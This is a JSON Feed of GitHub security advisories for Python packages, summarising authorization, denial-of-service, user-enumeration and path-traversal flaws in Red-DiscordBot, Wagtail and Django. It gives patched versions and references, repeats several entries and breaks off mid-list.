{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to a bug in Red's Core API, 3rd-party cogs using the <a href=\"https://docs.discord.red/en/stable/framework_checks.html#redbot.core.commands.can_manage_channel\"><code>@commands.can_manage_channel()</code></a> command permission check without additional permission controls may authorize a user to run a command even when that user doesn't have permissions to manage a channel.\nNone of the core commands or core cogs are affected. The maintainers of the project are not aware of any <em>public</em> 3rd-party cog utilizing this API at the time of writing this advisory.</p>\n<p>The <a href=\"https://docs.discord.red/en/stable/framework_checks.html#redbot.core.commands.mod_or_can_manage_channel\"><code>@commands.mod_or_can_manage_channel()</code></a>, <a href=\"https://docs.discord.red/en/stable/framework_checks.html#redbot.core.commands.admin_or_can_manage_channel\"><code>@commands.admin_or_can_manage_channel()</code></a>, and <a href=\"https://docs.discord.red/en/stable/framework_checks.html#redbot.core.commands.guildowner_or_can_manage_channel\"><code>@commands.guildowner_or_can_manage_channel()</code></a> command permission checks are unaffected.</p>\n<p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:L/SA:N/AU:Y/R:U/RE:L</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem was patched in PR #6398 and later released in version <a href=\"https://pypi.org/project/Red-DiscordBot/3.5.10/\">3.5.10</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Any cog using the <a href=\"https://docs.discord.red/en/stable/framework_checks.html#redbot.core.commands.can_manage_channel\"><code>@commands.can_manage_channel()</code></a> command permission check should be unloaded until an upgrade to a patched version can be performed.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/Cog-Creators/Red-DiscordBot/pull/6398\">https://github.com/Cog-Creators/Red-DiscordBot/pull/6398</a>\n<a href=\"https://github.com/Cog-Creators/Red-DiscordBot/releases/tag/3.5.10\">https://github.com/Cog-Creators/Red-DiscordBot/releases/tag/3.5.10</a>\n<a href=\"https://pypi.org/project/Red-DiscordBot/3.5.10/\">https://pypi.org/project/Red-DiscordBot/3.5.10/</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Cog-Creators/Red-DiscordBot/security/advisories/GHSA-5jq8-q6rj-9gq4\">https://github.com/Cog-Creators/Red-DiscordBot/security/advisories/GHSA-5jq8-q6rj-9gq4</a></li>\n<li><a href=\"https://github.com/Cog-Creators/Red-DiscordBot/pull/6398\">https://github.com/Cog-Creators/Red-DiscordBot/pull/6398</a></li>\n<li><a href=\"https://github.com/Cog-Creators/Red-DiscordBot/commit/0b0b23b9717b40ed4f8715720b199417c8e89750\">https://github.com/Cog-Creators/Red-DiscordBot/commit/0b0b23b9717b40ed4f8715720b199417c8e89750</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39905\">https://nvd.nist.gov/vuln/detail/CVE-2024-39905</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5jq8-q6rj-9gq4\">https://github.com/advisories/GHSA-5jq8-q6rj-9gq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5jq8-q6rj-9gq4",
            "title": "[Red-DiscordBot] Red-DiscordBot vulnerable to Incorrect Authorization in commands API",
            "date_modified": "2024-07-11T18:33:36.000Z",
            "date_published": "2024-07-11T17:32:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5jq8-q6rj-9gq4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bug in Wagtail's <a href=\"https://docs.wagtail.org/en/stable/topics/search/searching.html#wagtailsearch-query-string-parsing\"><code>parse_query_string</code></a> would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, <code>parse_query_string</code> would take an unexpectedly large amount of time to process, resulting in a denial of service.</p>\n<p>In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses <code>parse_query_string</code>, it may be exploitable by other users (e.g. unauthenticated users).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.</p>\n<p>This vulnerability affects all unpatched versions from Wagtail 2.0 onwards.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Site owners who are unable to upgrade to a patched version can limit the length of search terms passed to <code>parse_query_string</code>. Whilst the performance characteristics will depend on your hosting environment, 1000 characters has been shown to still be fairly fast, without triggering this vulnerability.</p>\n<p>No workaround is available for the Wagtail admin usage.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Many thanks to <a href=\"https://github.com/RealOrangeOne\">Jake Howard</a> for reporting this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Visit Wagtail's <a href=\"https://docs.wagtail.io/en/stable/support.html\">support channels</a></li>\n<li>Email us at <a href=\"mailto:security@wagtail.org\">security@wagtail.org</a> (view our <a href=\"https://github.com/wagtail/wagtail/security/policy\">security policy</a> for more information).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2\">https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797\">https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2\">https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39317\">https://nvd.nist.gov/vuln/detail/CVE-2024-39317</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8",
            "title": "[wagtail] Wagtail regular expression denial-of-service via search query parsing",
            "date_modified": "2024-07-11T18:33:31.000Z",
            "date_published": "2024-07-11T13:21:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bug in Wagtail's <a href=\"https://docs.wagtail.org/en/stable/topics/search/searching.html#wagtailsearch-query-string-parsing\"><code>parse_query_string</code></a> would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, <code>parse_query_string</code> would take an unexpectedly large amount of time to process, resulting in a denial of service.</p>\n<p>In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses <code>parse_query_string</code>, it may be exploitable by other users (e.g. unauthenticated users).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.</p>\n<p>This vulnerability affects all unpatched versions from Wagtail 2.0 onwards.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Site owners who are unable to upgrade to a patched version can limit the length of search terms passed to <code>parse_query_string</code>. Whilst the performance characteristics will depend on your hosting environment, 1000 characters has been shown to still be fairly fast, without triggering this vulnerability.</p>\n<p>No workaround is available for the Wagtail admin usage.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Many thanks to <a href=\"https://github.com/RealOrangeOne\">Jake Howard</a> for reporting this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Visit Wagtail's <a href=\"https://docs.wagtail.io/en/stable/support.html\">support channels</a></li>\n<li>Email us at <a href=\"mailto:security@wagtail.org\">security@wagtail.org</a> (view our <a href=\"https://github.com/wagtail/wagtail/security/policy\">security policy</a> for more information).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2\">https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797\">https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2\">https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39317\">https://nvd.nist.gov/vuln/detail/CVE-2024-39317</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8",
            "title": "[wagtail] Wagtail regular expression denial-of-service via search query parsing",
            "date_modified": "2024-07-11T18:33:31.000Z",
            "date_published": "2024-07-11T13:21:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bug in Wagtail's <a href=\"https://docs.wagtail.org/en/stable/topics/search/searching.html#wagtailsearch-query-string-parsing\"><code>parse_query_string</code></a> would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, <code>parse_query_string</code> would take an unexpectedly large amount of time to process, resulting in a denial of service.</p>\n<p>In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses <code>parse_query_string</code>, it may be exploitable by other users (e.g. unauthenticated users).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.</p>\n<p>This vulnerability affects all unpatched versions from Wagtail 2.0 onwards.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Site owners who are unable to upgrade to a patched version can limit the length of search terms passed to <code>parse_query_string</code>. Whilst the performance characteristics will depend on your hosting environment, 1000 characters has been shown to still be fairly fast, without triggering this vulnerability.</p>\n<p>No workaround is available for the Wagtail admin usage.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>Many thanks to <a href=\"https://github.com/RealOrangeOne\">Jake Howard</a> for reporting this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Visit Wagtail's <a href=\"https://docs.wagtail.io/en/stable/support.html\">support channels</a></li>\n<li>Email us at <a href=\"mailto:security@wagtail.org\">security@wagtail.org</a> (view our <a href=\"https://github.com/wagtail/wagtail/security/policy\">security policy</a> for more information).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/wagtail/wagtail/security/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2\">https://github.com/wagtail/wagtail/commit/31b1e8532dfb1b70d8d37d22aff9cbde9109cdf2</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797\">https://github.com/wagtail/wagtail/commit/3c941136f79c48446e3858df46e5b668d7f83797</a></li>\n<li><a href=\"https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2\">https://github.com/wagtail/wagtail/commit/b783c096b6d4fd2cfc05f9137a0be288850e99a2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39317\">https://nvd.nist.gov/vuln/detail/CVE-2024-39317</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmp3-39vp-fwg8\">https://github.com/advisories/GHSA-jmp3-39vp-fwg8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8",
            "title": "[wagtail] Wagtail regular expression denial-of-service via search query parsing",
            "date_modified": "2024-07-11T18:33:31.000Z",
            "date_published": "2024-07-11T13:21:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmp3-39vp-fwg8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. <code>get_supported_language_variant()</code> was subject to a potential denial-of-service attack when used with very long strings containing specific characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39614\">https://nvd.nist.gov/vuln/detail/CVE-2024-39614</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/17358fb35fb7217423d4c4877ccb6d1a3a40b1c3\">https://github.com/django/django/commit/17358fb35fb7217423d4c4877ccb6d1a3a40b1c3</a></li>\n<li><a href=\"https://github.com/django/django/commit/8e7a44e4bec0f11474699c3111a5e0a45afe7f49\">https://github.com/django/django/commit/8e7a44e4bec0f11474699c3111a5e0a45afe7f49</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-59.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-59.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f6f8-9mx6-9mx2\">https://github.com/advisories/GHSA-f6f8-9mx6-9mx2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f6f8-9mx6-9mx2",
            "title": "[Django] Django vulnerable to Denial of Service",
            "date_modified": "2024-07-10T21:43:26.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f6f8-9mx6-9mx2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. <code>get_supported_language_variant()</code> was subject to a potential denial-of-service attack when used with very long strings containing specific characters.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39614\">https://nvd.nist.gov/vuln/detail/CVE-2024-39614</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/17358fb35fb7217423d4c4877ccb6d1a3a40b1c3\">https://github.com/django/django/commit/17358fb35fb7217423d4c4877ccb6d1a3a40b1c3</a></li>\n<li><a href=\"https://github.com/django/django/commit/8e7a44e4bec0f11474699c3111a5e0a45afe7f49\">https://github.com/django/django/commit/8e7a44e4bec0f11474699c3111a5e0a45afe7f49</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-59.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-59.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f6f8-9mx6-9mx2\">https://github.com/advisories/GHSA-f6f8-9mx6-9mx2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f6f8-9mx6-9mx2",
            "title": "[Django] Django vulnerable to Denial of Service",
            "date_modified": "2024-07-10T21:43:26.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f6f8-9mx6-9mx2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. The <code>django.contrib.auth.backends.ModelBackend.authenticate()</code> method allows remote attackers to enumerate users via a timing attack involving login requests for users with an unusable password.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39329\">https://nvd.nist.gov/vuln/detail/CVE-2024-39329</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/07cefdee4a9d1fcd9a3a631cbd07c78defd1923b\">https://github.com/django/django/commit/07cefdee4a9d1fcd9a3a631cbd07c78defd1923b</a></li>\n<li><a href=\"https://github.com/django/django/commit/156d3186c96e3ec2ca73b8b25dc2ef366e38df14\">https://github.com/django/django/commit/156d3186c96e3ec2ca73b8b25dc2ef366e38df14</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-57.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-57.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x7q2-wr7g-xqmf\">https://github.com/advisories/GHSA-x7q2-wr7g-xqmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x7q2-wr7g-xqmf",
            "title": "[Django] Django vulnerable to user enumeration attack",
            "date_modified": "2024-07-11T17:26:09.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x7q2-wr7g-xqmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. The <code>django.contrib.auth.backends.ModelBackend.authenticate()</code> method allows remote attackers to enumerate users via a timing attack involving login requests for users with an unusable password.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39329\">https://nvd.nist.gov/vuln/detail/CVE-2024-39329</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/07cefdee4a9d1fcd9a3a631cbd07c78defd1923b\">https://github.com/django/django/commit/07cefdee4a9d1fcd9a3a631cbd07c78defd1923b</a></li>\n<li><a href=\"https://github.com/django/django/commit/156d3186c96e3ec2ca73b8b25dc2ef366e38df14\">https://github.com/django/django/commit/156d3186c96e3ec2ca73b8b25dc2ef366e38df14</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-57.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-57.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x7q2-wr7g-xqmf\">https://github.com/advisories/GHSA-x7q2-wr7g-xqmf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x7q2-wr7g-xqmf",
            "title": "[Django] Django vulnerable to user enumeration attack",
            "date_modified": "2024-07-11T17:26:09.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x7q2-wr7g-xqmf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. Derived classes of the <code>django.core.files.storage.Storage</code> base class, when they override <code>generate_filename()</code> without replicating the file-path validations from the parent class, potentially allow directory traversal via certain inputs during a <code>save()</code> call. (Built-in Storage sub-classes are unaffected.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39330\">https://nvd.nist.gov/vuln/detail/CVE-2024-39330</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/2b00edc0151a660d1eb86da4059904a0fc4e095e\">https://github.com/django/django/commit/2b00edc0151a660d1eb86da4059904a0fc4e095e</a></li>\n<li><a href=\"https://github.com/django/django/commit/9f4f63e9ebb7bf6cb9547ee4e2526b9b96703270\">https://github.com/django/django/commit/9f4f63e9ebb7bf6cb9547ee4e2526b9b96703270</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-58.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-58.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jmf-237g-qf46\">https://github.com/advisories/GHSA-9jmf-237g-qf46</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jmf-237g-qf46",
            "title": "[Django] Django Path Traversal vulnerability",
            "date_modified": "2024-07-10T21:41:36.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jmf-237g-qf46"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. Derived classes of the <code>django.core.files.storage.Storage</code> base class, when they override <code>generate_filename()</code> without replicating the file-path validations from the parent class, potentially allow directory traversal via certain inputs during a <code>save()</code> call. (Built-in Storage sub-classes are unaffected.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39330\">https://nvd.nist.gov/vuln/detail/CVE-2024-39330</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/2b00edc0151a660d1eb86da4059904a0fc4e095e\">https://github.com/django/django/commit/2b00edc0151a660d1eb86da4059904a0fc4e095e</a></li>\n<li><a href=\"https://github.com/django/django/commit/9f4f63e9ebb7bf6cb9547ee4e2526b9b96703270\">https://github.com/django/django/commit/9f4f63e9ebb7bf6cb9547ee4e2526b9b96703270</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-58.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-58.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jmf-237g-qf46\">https://github.com/advisories/GHSA-9jmf-237g-qf46</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jmf-237g-qf46",
            "title": "[Django] Django Path Traversal vulnerability",
            "date_modified": "2024-07-10T21:41:36.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jmf-237g-qf46"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 4.2 before 4.2.14 and 5.0 before 5.0.7. urlize and urlizetrunc were subject to a potential denial of service attack via certain inputs with a very large number of brackets.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38875\">https://nvd.nist.gov/vuln/detail/CVE-2024-38875</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/7285644640f085f41d60ab0c8ae4e9153f0485db\">https://github.com/django/django/commit/7285644640f085f41d60ab0c8ae4e9153f0485db</a></li>\n<li><a href=\"https://github.com/django/django/commit/79f368764295df109a37192f6182fb6f361d85b5\">https://github.com/django/django/commit/79f368764295df109a37192f6182fb6f361d85b5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-56.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-56.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg2p-9jwr-mmqf\">https://github.com/advisories/GHSA-qg2p-9jwr-mmqf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg2p-9jwr-mmqf",
            "title": "[Django] Django vulnerable to Denial of Service",
            "date_modified": "2024-07-10T21:41:06.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg2p-9jwr-mmqf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 4.2 before 4.2.14 and 5.0 before 5.0.7. urlize and urlizetrunc were subject to a potential denial of service attack via certain inputs with a very large number of brackets.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38875\">https://nvd.nist.gov/vuln/detail/CVE-2024-38875</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/forum/#%21forum/django-announce\">https://groups.google.com/forum/#%21forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2024/jul/09/security-releases\">https://www.djangoproject.com/weblog/2024/jul/09/security-releases</a></li>\n<li><a href=\"https://github.com/django/django/commit/7285644640f085f41d60ab0c8ae4e9153f0485db\">https://github.com/django/django/commit/7285644640f085f41d60ab0c8ae4e9153f0485db</a></li>\n<li><a href=\"https://github.com/django/django/commit/79f368764295df109a37192f6182fb6f361d85b5\">https://github.com/django/django/commit/79f368764295df109a37192f6182fb6f361d85b5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-56.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-56.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg2p-9jwr-mmqf\">https://github.com/advisories/GHSA-qg2p-9jwr-mmqf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg2p-9jwr-mmqf",
            "title": "[Django] Django vulnerable to Denial of Service",
            "date_modified": "2024-07-10T21:41:06.000Z",
            "date_published": "2024-07-10T06:33:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg2p-9jwr-mmqf"
            },
            "tags": [
                "severity"
            ]
        },
        {
